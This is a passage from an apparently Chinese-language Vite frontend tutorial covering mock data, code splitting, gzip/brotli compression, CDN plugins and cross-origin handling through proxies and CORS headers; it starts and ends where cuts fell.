            <span class="hljs-attr">mockPath</span>: <span class="hljs-string">'./src/mock'</span>, <span class="hljs-comment">// 模拟数据文件所在的目录</span>
            <span class="hljs-attr">localEnabled</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 开发环境是否启用 mock</span>
            <span class="hljs-attr">prodEnabled</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">// 生产环境是否启用 mock（一般关闭）</span>
        })
  ]
});
</code></pre>
<p><strong>使用</strong></p>
<p>在src目录下创建<code>src/mock/user.js</code></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// user.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> [
  {
    <span class="hljs-attr">url</span>: <span class="hljs-string">'/api/users'</span>, <span class="hljs-comment">// 要拦截的 API 路径</span>
    <span class="hljs-attr">method</span>: <span class="hljs-string">'get'</span>, <span class="hljs-comment">// 请求方法</span>
    <span class="hljs-attr">response</span>: <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-comment">// 模拟返回的数据</span>
      <span class="hljs-keyword">return</span> {
        <span class="hljs-attr">code</span>: <span class="hljs-number">200</span>,
        <span class="hljs-attr">message</span>: <span class="hljs-string">'success'</span>,
        <span class="hljs-attr">data</span>: [
          { <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'张三'</span> },
          { <span class="hljs-attr">id</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'李四'</span> },
        ],
      };
    },
  },
];
</code></pre>
<p>在main.js中请求</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// main.js</span>
<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/users'</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res);
})
</code></pre>
<p>启动开发服务，查看浏览器请求预览</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f6e17661ec224143b07a8d162c2a0d32~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=%2BSTecxYOKpckzzdiim4ZWtHurEQ%3D" loading="lazy"/>
<h3 data-id="heading-60">生产环境性能优化</h3>
<h4 data-id="heading-61"><strong>分包策略:代码分割</strong></h4>
<p>对于vite中的代码分割的原理可以参考这一篇文章：<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1919790978333639843" target="_blank" title="https://zhuanlan.zhihu.com/p/1919790978333639843" ref="nofollow noopener noreferrer">深入解析 Vite 代码分割原理：从依赖入口点算法到动态导入优化 - WangHaoyu的文章 - 知乎。</a></p>
<h5 data-id="heading-62">作用：</h5>
<p>在实际项目中，我们在生产环境打包时，对于那些第三方库和自己的代码可以分开打包，这样做的好处有以下几点：</p>
<ul>
<li>消除代码冗余，减小总打包体积</li>
</ul>
<p>大型项目中，多个页面可能共用同一个组件（如弹窗、按钮），不分割的话，这个组件会被重复打包到每个页面的 bundle 里，导致总体积膨胀。</p>
<p>代码分割会把 “公共代码” 抽成独立 chunk，只打包一次，所有页面共享 ——<strong>总打包体积更小，且不会出现重复代码</strong>。</p>
<ul>
<li>减少首屏加载时间，提升用户体验</li>
</ul>
<p>不分割的代码会打包成一个巨大的<code>bundle.js</code>（可能几 MB 甚至十几 MB），用户打开页面时，必须等这个文件完全下载、解析、执行才能看到内容，体验极差（尤其是弱网 / 移动端）。</p>
<p>代码分割后，会优先加载「首屏必需的代码」（比如首页渲染、登录逻辑），非必需的代码（比如详情页、设置页、大型组件）延迟加载（按需加载）。</p>
<ul>
<li>利用浏览器缓存，减少用户重复下载</li>
</ul>
<p>把稳定不变的代码（第三方依赖、公共组件）拆成独立 chunk（比如<code>vendors~main.js</code>），这些 chunk 的文件名通常会带哈希（如<code>vendors~main.123abc.js</code>）。</p>
<p>用户第一次访问时下载这些 chunk，之后只要依赖 / 公共组件不更新，哈希值不变，浏览器会直接用缓存的文件，不用重新下载。
后续你修改业务代码时，只有 “业务 chunk” 的哈希变化，用户只需下载这个小体积的更新文件，而非整个大 bundle——<strong>更新迭代时的用户下载成本大幅降低</strong>。</p>
<h5 data-id="heading-63">build.rollupOptions.output.manualChunks</h5>
<pre><code class="hljs language-js" lang="js"><span class="hljs-attr">build</span>: {
    <span class="hljs-attr">rollupOptions</span>: {
        <span class="hljs-attr">output</span>: {
            <span class="hljs-comment">// 第一种接收一个对象</span>
            <span class="hljs-comment">// manualChunks: {</span>
            <span class="hljs-comment">// // rollup会将node_modules下的vue、axios...等数组中有的库打包到vendor开头的文件中</span>
            <span class="hljs-comment">//     vendor: ['vue', 'axios', ...],</span>
            <span class="hljs-comment">// }</span>
            <span class="hljs-comment">// 第二种接收一个函数</span>
            <span class="hljs-attr">manualChunks</span>: <span class="hljs-function"><span class="hljs-params">id</span> =&gt;</span> {
                <span class="hljs-comment">// 将node_modules下的文件全部打包到vendor开头的文件中</span>
                <span class="hljs-keyword">if</span> (id.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'node_modules'</span>)) {
                    <span class="hljs-keyword">return</span> <span class="hljs-string">'vendor'</span>
                }
            }
        }
    }
}
</code></pre>
<h5 data-id="heading-64">示例：</h5>
<p>例如，没有配置前运行<code>pnpm build命令</code>，查看控制台输出</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/63734d1e05484eab8b6f785b0c021fd0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=Wws375lEKgGKNe8FQj6DbY9wvYE%3D" alt="" loading="lazy"/></p>
<p>可以看到所有代码（包括第三方库、自己写的代码）都被打包为了<code>index-Bhk5f-Te.js</code>，在<code>main.js</code>中添加一行代码，如<code>console.log(111)</code>,重新运行<code>pnpm build</code></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0602689f6ede4c56ada640246b6a02dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=BdV8Az4kd475tgxCXYZYCFNYXlY%3D" alt="" loading="lazy"/></p>
<p>可以看到我们仅仅修改了一小段代码，而在生产打包时，却是将所有代码都打包了，重新生成了新的hash值，这样每次修改代码，都要全量打包是非常消耗性能的，一是没法利用浏览器缓存机制来减少请求体积，二是每次更新的体积较大（因为不是只更新代码修改部分）。</p>
<p>下面我们来看看添加了配置项的情况：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-attr">manualChunks</span>: <span class="hljs-function"><span class="hljs-params">id</span> =&gt;</span> {
    <span class="hljs-keyword">if</span> ( id.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'node_modules'</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">'vendor'</span>
    }
}
</code></pre>
<p>运行<code>pnpm build</code>命令，查看控制台：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c7c342b777c04d59bc425a2492e71651~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=vXTpfDlC3H02fAvJ2F3kAfDL0%2FQ%3D" alt="" loading="lazy"/></p>
<p>可以看到原先的代码文件被打包成了两个，并且<code>node_modules</code>下的文件被打包为了<code>vendor-</code>开头的文件。然后我们再次修改<code>main.js</code>中的代码，重新打包得到如下结果：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e269cfda50854e1fa1045fc502a300c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=v1nXy1FAsJcx6hG6MqlUelUZT3c%3D" alt="" loading="lazy"/>
这次打包我们可以观察到，Vite在打包时仅仅对<code>index-</code>开头的文件进行了重新打包，对于<code>vendor-</code>开头的文件而是利用缓存，不进行重新打包，并且我们可以看到，重新打包的那部分代码体积是远小于没有变动的那部分体积的。</p>
<h4 data-id="heading-65">gzip压缩</h4>
<p><strong>引言：</strong></p>
<p>在 Vite 中，<strong>gzip 压缩</strong>是前端性能优化的关键手段之一——核心作用是<strong>减小静态资源（JS/CSS/ 图片等）的传输体积</strong>，从而提升首屏加载速度、降低服务器带宽成本，尤其对大体积 JS bundle 或弱网环境效果显著。</p>
<h5 data-id="heading-66">原理：</h5>
<p>gzip 是一种<strong>无损数据压缩算法</strong>（压缩后能完全还原原始内容），其核心逻辑是：</p>
<ol>
<li>识别文件中重复出现的字符串 / 数据，用「索引 + 标记」替代重复内容（比如 JS 中大量重复的变量名、函数体、注释）；</li>
<li>压缩后的文件后缀通常为 <code>.gz</code>（如 <code>main.js.gz</code>、<code>index.css.gz</code>）；</li>
<li>浏览器请求资源时，会在 HTTP 请求头中携带 <code>Accept-Encoding: gzip, deflate</code>（表示支持 gzip 压缩）；</li>
<li>服务器收到请求后，若存在对应的 <code>.gz</code> 压缩文件，会返回压缩文件，并在响应头中添加 <code>Content-Encoding: gzip</code>；</li>
<li>浏览器收到压缩文件后，自动解压并执行 / 渲染。</li>
</ol>
<h5 data-id="heading-67"><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnonzzz%2Fvite-plugin-compression" target="_blank" title="https://github.com/nonzzz/vite-plugin-compression" ref="nofollow noopener noreferrer">vite-plugin-compression2</a></h5>
<p>Viteb本身没有内置gzip压缩的功能，所以需要借助<code>vite-plugin-compression2</code>这个插件来实现</p>
<pre><code class="hljs language-powershell" lang="powershell">pnpm add vite-plugin-compression2 -D
</code></pre>
<p><strong>基本使用方式：</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-keyword">import</span> { compression } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite-plugin-compression2'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-comment">// ...其他插件</span>
    <span class="hljs-title function_">compression</span>()
  ]
})
</code></pre>
<p><strong>常见配置项</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// vite.config.js</span>
<span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>;
<span class="hljs-keyword">import</span> compression <span class="hljs-keyword">from</span> <span class="hljs-string">'vite-plugin-compression2'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-comment">// 1. gzip 压缩（兼容老浏览器，优先级低）</span>
    <span class="hljs-title function_">compression</span>({
      <span class="hljs-attr">algorithm</span>: <span class="hljs-string">'gzip'</span>, <span class="hljs-comment">// 压缩算法</span>
      <span class="hljs-attr">ext</span>: <span class="hljs-string">'.gz'</span>, <span class="hljs-comment">// 压缩文件后缀</span>
      <span class="hljs-attr">threshold</span>: <span class="hljs-number">1024</span>, <span class="hljs-comment">// 1KB 以上才压缩（小文件没必要）</span>
      <span class="hljs-attr">deleteOriginFile</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">// 不删除原始文件（兼容不支持压缩的浏览器）</span>
      <span class="hljs-attr">include</span>: <span class="hljs-regexp">/\.(js|css|html|svg|json|txt)$/</span>, <span class="hljs-comment">// 只压缩文本类资源</span>
      <span class="hljs-attr">exclude</span>: <span class="hljs-regexp">/\.(png|jpg|jpeg|webp|mp4|woff2)$/</span>, <span class="hljs-comment">// 排除已压缩的资源（图片/视频/字体）</span>
      <span class="hljs-attr">compressionOptions</span>: { <span class="hljs-attr">level</span>: <span class="hljs-number">6</span> }, <span class="hljs-comment">// 压缩等级（0-9，6 是平衡值）</span>
      <span class="hljs-attr">filename</span>: <span class="hljs-string">'[path][base].gz'</span>, <span class="hljs-comment">// 压缩文件命名格式（默认即可）</span>
    }),
    <span class="hljs-comment">// 2. brotli 压缩（现代浏览器优先，压缩率更高）</span>
    <span class="hljs-title function_">compression</span>({
      <span class="hljs-attr">algorithm</span>: <span class="hljs-string">'brotliCompress'</span>,
      <span class="hljs-attr">ext</span>: <span class="hljs-string">'.br'</span>,
      <span class="hljs-attr">threshold</span>: <span class="hljs-number">1024</span>,
      <span class="hljs-attr">deleteOriginFile</span>: <span class="hljs-literal">false</span>,
      <span class="hljs-attr">include</span>: <span class="hljs-regexp">/\.(js|css|html|svg|json|txt)$/</span>,
      <span class="hljs-attr">exclude</span>: <span class="hljs-regexp">/\.(png|jpg|jpeg|webp|mp4|woff2)$/</span>,
      <span class="hljs-attr">compressionOptions</span>: { <span class="hljs-attr">level</span>: <span class="hljs-number">11</span> }, <span class="hljs-comment">// brotli 最高等级 11，压缩率最优</span>
    }),
  ],
});
</code></pre>
<p><strong>使用注意</strong></p>
<ol>
<li>服务器 / CDN 需配置：支持根据 <code>Accept-Encoding</code> 请求头，返回对应的 <code>.gz</code>/<code>.br</code> 压缩文件（否则压缩产物白生成），并且如果CDN支持自动压缩，可以关闭压缩插件；</li>
<li>避免对无效压缩（如对<code>png、jpg、woff</code>等非文本类文件进行压缩，配置<code>exclude</code>避开），否则会浪费构建时间和存储空间。</li>
<li>小体积不要使用gzip压缩，因为浏览器解压也会消耗时间，所以对于小体积文件要避免进行压缩。</li>
<li>浏览器兼容：gzip 适配所有浏览器（含老版），brotli 覆盖 95%+ 现代浏览器，zstd 仅适合新版浏览器；</li>
<li>构建正常：<code>vite build</code> 能生成完整 <code>dist</code> 目录（无语法 / 依赖错误）。</li>
</ol>
<h5 data-id="heading-68">示例：</h5>
<p>正常运行构建命令<code>pnpm build</code>，我们其实可以看到控制台中的输出信息中给出了压缩前后的对比</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f86e91bec7bd430cb577ca3bb292f4e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=u8f%2BO0GDzvj7GW%2Fy0nVLgHQN%2Bwg%3D" alt="" loading="lazy"/></p>
<p>红色部分是压缩前的体积，蓝色部分呢是采用gzip压缩后的体积。安装插件并使用：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/37de229f42c844feb0214896e2b70111~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=1Kia1JKJmvHxHXmcNNQgFYhbxKY%3D" alt="" loading="lazy"/></p>
<p>可以看到压缩后的结果。</p>
<h4 data-id="heading-69">CDN优化</h4>
<p>CDN 全称 <strong>Content Delivery Network</strong>，即<strong>内容分发网络</strong>，是一种经策略性部署的分布式网络架构，核心是通过在全球或区域内广泛部署边缘服务器节点，将源站的内容缓存到离用户最近的节点，让用户就近获取资源，以此解决网络带宽小、用户分布不均等导致的访问慢问题。</p>
<p><strong>引入</strong>：</p>
<p>在项目开发中，我们常会引入 Vue、axios、Lodash 等第三方库。默认打包流程中，这些库会被合并到生产环境的业务代码 bundle 中，最终由用户从业务服务器加载完整资源包。</p>
<p>假设有这样的场景：我们的业务服务器 B 部署在中国成都，而用户 A 位于美国纽约。当用户 A 访问网站时，所有资源（包括第三方库代码）都需要从成都的服务器 B 跨洋传输。由于地理距离遥远，网络链路长、延迟高，资源加载耗时久，可能出现页面白屏、交互卡顿等问题，严重影响用户体验。</p>
<p>这正是 CDN（内容分发网络）的核心优化场景 —— 我们无需自行在纽约部署服务器，而是可以借助成熟的公共 CDN 服务：将 Vue、axios 等通用性强的第三方库，托管到全球分布式的 CDN 节点（包括纽约附近的边缘节点）。当用户 A 访问网站时，会通过 CDN 的智能路由机制，自动从距离最近的纽约边缘节点加载这些第三方库资源，无需跨洋请求成都的服务器 B。</p>
<p>这样一来，第三方库的加载距离大幅缩短，网络延迟和传输耗时显著降低，配合业务代码的合理优化（如代码分割、本地缓存），用户 A 能更快地完成页面资源加载与渲染，网站访问速度和体验得到明显提升。</p>
<h5 data-id="heading-70"><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnonzzz%2Fvite-plugin-cdn" target="_blank" title="https://github.com/nonzzz/vite-plugin-cdn" ref="nofollow noopener noreferrer">vite-plugin-cdn2</a></h5>
<pre><code class="hljs language-powershell" lang="powershell"> pnpm add vite-plugin-cdn2 -D
</code></pre>
<p><strong>配置示例</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// vite.config.js</span>
<span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>;
<span class="hljs-keyword">import</span> vue <span class="hljs-keyword">from</span> <span class="hljs-string">'@vitejs/plugin-vue'</span>;
<span class="hljs-keyword">import</span> cdn2 <span class="hljs-keyword">from</span> <span class="hljs-string">'vite-plugin-cdn2'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-title function_">vue</span>(),
    <span class="hljs-title function_">cdn2</span>({
      <span class="hljs-comment">// 新增全局配置（统一控制启用状态、CDN 源等）</span>
      <span class="hljs-attr">options</span>: {
        <span class="hljs-attr">enabled</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">'production'</span>,
        <span class="hljs-attr">defaultCDN</span>: <span class="hljs-string">'jsdelivr'</span>,
        <span class="hljs-attr">autoComplete</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 自动补全 path 和 var，无需手动写</span>
      },
      <span class="hljs-attr">modules</span>: [
        { <span class="hljs-attr">name</span>: <span class="hljs-string">'vue'</span> }, <span class="hljs-comment">// 仅需写 name，其余自动识别</span>
        { <span class="hljs-attr">name</span>: <span class="hljs-string">'axios'</span> },
      ],
    }),
  ]
})
</code></pre>
<hr/>
<h3 data-id="heading-71">跨域</h3>
<p>产生跨域的原因是由于浏览器的<strong>同源策略</strong>，不符合同源策略条件就会产生跨域。</p>
<h4 data-id="heading-72">同源策略</h4>
<p><strong>协议、域名（含子域名）、端口三者必须完全一致</strong>，只要有一个不同，就是跨域：</p>








































<table><thead><tr><th>对比项</th><th>示例（当前页面：<code>https://a.com:443</code>）</th><th>是否跨域？</th></tr></thead><tbody><tr><td>协议不同</td><td><code>http://a.com</code>（http vs https）</td><td>是</td></tr><tr><td>域名不同</td><td><code>https://b.com</code>（a vs b）</td><td>是</td></tr><tr><td>子域名不同</td><td><code>https://api.a.com</code>（主域 vs 子域）</td><td>是</td></tr><tr><td>端口不同</td><td><code>https://a.com:8080</code>（443 vs 8080）</td><td>是</td></tr><tr><td>仅路径不同</td><td><code>https://a.com/user</code>（路径不同）</td><td>否（同源）</td></tr><tr><td>仅查询参数不同</td><td><code>https://a.com?name=test</code>（参数不同）</td><td>否（同源）</td></tr></tbody></table>
<p>⚠️ 注意：「跨域」仅存在于<strong>浏览器端</strong>（浏览器的安全限制），服务端之间的请求（如 Node.js 调用接口、Nginx 反向代理）完全没有跨域问题 —— 这也是 代理方案 能解决跨域的核心原理。</p>
<p><strong>例如</strong>：</p>
<p>直接请求百度</p>
<pre><code class="hljs language-js" lang="js">axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">'http://www.baidu.com'</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res)
})
</code></pre>
<p>浏览器报错</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58ad4070f2704e9d8613b51f031b26bf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=h%2FhHGOAw3IOG0Gepydk9p9oClHs%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-73">开发环境：Proxy 代理</h4>
<p>通过「中间服务器转发请求」，绕开浏览器同源策略。</p>
<h5 data-id="heading-74">1. 核心配置（vite.config.js）</h5>
<p>假设前端项目地址：<code>http://localhost:5173</code>（Vite 默认端口），后端接口地址：<code>https://api.b.com</code>（跨域），配置如下：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">server</span>: {
    <span class="hljs-attr">proxy</span>: {
      <span class="hljs-comment">// 1. 基础代理：匹配所有以 /api 开头的请求</span>
      <span class="hljs-string">'/api'</span>: {
        <span class="hljs-attr">target</span>: <span class="hljs-string">'https://www.baidu.com'</span>, <span class="hljs-comment">// 后端接口根地址</span>
        <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 关键：让后端认为请求来自代理服务器（而非浏览器），避免后端校验 Origin 失败</span>
        <span class="hljs-attr">rewrite</span>: <span class="hljs-function">(<span class="hljs-params">path</span>) =&gt;</span> path.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^\/api/</span>, <span class="hljs-string">''</span>), <span class="hljs-comment">// 可选：重写路径（如前端 /api/user → 后端 /user）</span>
        <span class="hljs-comment">// 可选：处理 HTTPS 接口（若后端是 HTTPS，需配置）</span>
        <span class="hljs-attr">secure</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">// 忽略 SSL 证书校验（开发环境可用，生产环境需开启 true）</span>
        <span class="hljs-attr">headers</span>: {
          <span class="hljs-comment">// 可选：添加自定义请求头（如授权、版本号）</span>
          <span class="hljs-string">'X-Proxy'</span>: <span class="hljs-string">'Vite-Proxy'</span>,
        },
      },
    },
  },
});
</code></pre>
<h5 data-id="heading-75">2. 前端请求示例</h5>
<pre><code class="hljs language-javascript" lang="javascript">axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/api'</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res)
})
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b4d0d74ca9c34409b887fce6e9a9fa80~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=5pWUZW6TydujCWU9k9BdENPnmK8%3D" alt="" loading="lazy"/></p>
<p>请求成功并且控制台没有报错信息：</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6dfb1a6f00824574aac3aec9c5008ecf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=I829PtWxBD7JLBBp4IgvTjHA%2FgU%3D" loading="lazy"/>
<h5 data-id="heading-76">3. 注意</h5>
<ul>
<li>「后端报 Origin 不允许」：必开 <code>changeOrigin: true</code>（让代理服务器转发时，将 Origin 改为 <code>target</code> 地址，而非前端 <code>localhost:5173</code>）；</li>
<li>「HTTPS 接口请求失败」：开发环境配置 <code>secure: false</code>（忽略证书校验），生产环境需确保后端 SSL 证书有效，再改为 <code>true</code>；</li>
<li>「路径匹配错误」：若后端接口没有统一前缀（如直接是 <code>https://api.b.com/user</code>），前端无需加 <code>/api</code>，直接匹配 <code>'/'</code>（但不推荐，可能冲突）；</li>
<li>「代理不生效」：检查 Vite 是否重启（修改 proxy 后需重启 Vite），或请求路径是否匹配代理规则（如 <code>/api/user</code> 才会触发 <code>/api</code> 代理）。</li>
</ul>
<h4 data-id="heading-77">生产环境：2 种核心方案（Nginx 代理 vs CORS 跨域头）</h4>
<p>生产环境没有 Vite 代理，需通过<strong>服务端代理</strong>或<strong>CORS 跨域头</strong>解决，两者各有适用场景：</p>
<h5 data-id="heading-78">方案 1：Nginx 反向代理（推荐，适合前后端分离部署）</h5>
<p>原理和 Vite Proxy 一致：通过 Nginx 转发前端请求到后端，绕开浏览器跨域限制 ——<strong>优势是前端无需任何修改，跨域逻辑完全由服务端管控</strong>。</p>
<ul>
<li>前后端分离部署（前端 Nginx 托管，后端独立部署）；</li>
<li>后端不允许直接对外暴露（需通过 Nginx 做权限控制、限流）；</li>
<li>需隐藏后端真实地址（提高安全性）。</li>
</ul>
<h5 data-id="heading-79">方案 2：后端配置 CORS 跨域头（简单直接，适合后端可修改）</h5>
<p>你的理解很准：通过后端返回 <code>Access-Control-Allow-*</code> 系列头，告诉浏览器「允许该源的跨域请求」——<strong>优势是无需配置 Nginx，后端单独搞定</strong>。</p>
<p><strong>核心 CORS 响应头（后端需返回）</strong></p>



































<table><thead><tr><th>响应头</th><th>作用说明</th><th>示例值</th></tr></thead><tbody><tr><td><code>Access-Control-Allow-Origin</code></td><td>允许跨域的源（必填）：<code>*</code> 表示所有源（不推荐，有安全风险），指定域名更安全</td><td><code>https://a.com</code>（仅允许 <a href="https://link.juejin.cn?target=https%3A%2F%2Fa.com%2F" target="_blank" title="https://a.com/" ref="nofollow noopener noreferrer">a.com</a>）</td></tr><tr><td><code>Access-Control-Allow-Methods</code></td><td>允许的请求方法（必填）</td><td><code>GET,POST,PUT,DELETE,OPTIONS</code></td></tr><tr><td><code>Access-Control-Allow-Headers</code></td><td>允许的自定义请求头（如 Token、Content-Type）</td><td><code>Authorization,Content-Type</code></td></tr><tr><td><code>Access-Control-Allow-Credentials</code></td><td>是否允许携带 Cookie（可选）：true 表示允许（此时 Origin 不能为 *）</td><td><code>true</code></td></tr><tr><td><code>Access-Control-Max-Age</code></td><td>预检请求（OPTIONS）的缓存时间（可选）：减少 OPTIONS 请求次数</td><td><code>86400</code>（24 小时）</td></tr></tbody></table>
<p><strong>前端请求示例（需携带 Cookie 时）</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">'https://api.b.com/user'</span>, {
  <span class="hljs-attr">withCredentials</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 关键：允许携带 Cookie（需和后端 Access-Control-Allow-Credentials: true 配合）</span>
});
</code></pre>
<p><strong>适用场景：</strong></p>
<ul>
<li>后端可直接对外暴露（如公开 API）；</li>
<li>前后端部署在不同域名，且不想配置 Nginx；</li>
<li>需携带 Cookie 进行身份验证（如单点登录）。</li>
</ul>
<p><strong>安全注意：</strong></p>
<ul>
<li>禁止用 <code>Access-Control-Allow-Origin: *</code>（允许所有源跨域，有 CSRF 风险），必须指定具体域名；</li>
<li>若允许携带 Cookie，<code>Access-Control-Allow-Origin</code> 不能为 <code>*</code>，且需配置 <code>Access-Control-Allow-Credentials: true</code>；</li>
<li>限制 <code>Access-Control-Allow-Methods</code> 和 <code>Access-Control-Allow-Headers</code> 为必需值，避免过度开放。</li>
</ul>
<h4 data-id="heading-80">其他跨域方案（特殊场景补充）</h4>
<p>除了上面的核心方案，还有 2 种特殊场景的跨域方法，作为补充：</p>
<h5 data-id="heading-81">1. JSONP（仅支持 GET 请求，几乎淘汰）</h5>
<p>原理：利用 <code>&lt;script&gt;</code> 标签不受同源策略限制的特性，通过动态创建 <code>&lt;script&gt;</code> 标签请求接口，后端返回回调函数包裹的 JSON 数据。</p>
<ul>
<li>缺点：仅支持 GET 方法、安全性差（可能注入恶意代码）、无法携带 Cookie；</li>
<li>适用场景：极老的后端系统（不支持 CORS 和代理），现在几乎不用。</li>
</ul>
<h5 data-id="heading-82">2. document.domain + iframe（仅适合同主域不同子域）</h5>
<p>原理：若前端是 <code>a.com</code>，iframe 是 <code>api.a.com</code>（同主域不同子域），可通过 <code>document.domain = 'a.com'</code> 让两者同源，实现跨域通信。</p>
<ul>
<li>缺点：仅适合同主域、需操作 iframe，灵活性差；</li>
<li>适用场景：老项目的 iframe 通信，现在很少用。</li>
</ul>
<h4 data-id="heading-83">常见误区（必看，避免踩坑）</h4>
<ol>
<li><strong>前端配置 CORS 头就能解决跨域</strong>：错！CORS 是后端返回的响应头，前端配置无效（浏览器只认后端返回的头）；</li>
<li><strong>生产环境用 Vite Proxy</strong>：错！Vite Proxy 仅用于开发环境，生产环境需用 Nginx 代理或 CORS；</li>
<li><strong>Access-Control-Allow-Origin: * 万能</strong>：错！有安全风险，且不支持携带 Cookie；</li>
<li><strong>跨域请求不会发送</strong>：错！跨域请求会发送，浏览器会在「收到响应后」检查 CORS 头，若不允许则拦截响应（而非阻止请求发送）；</li>
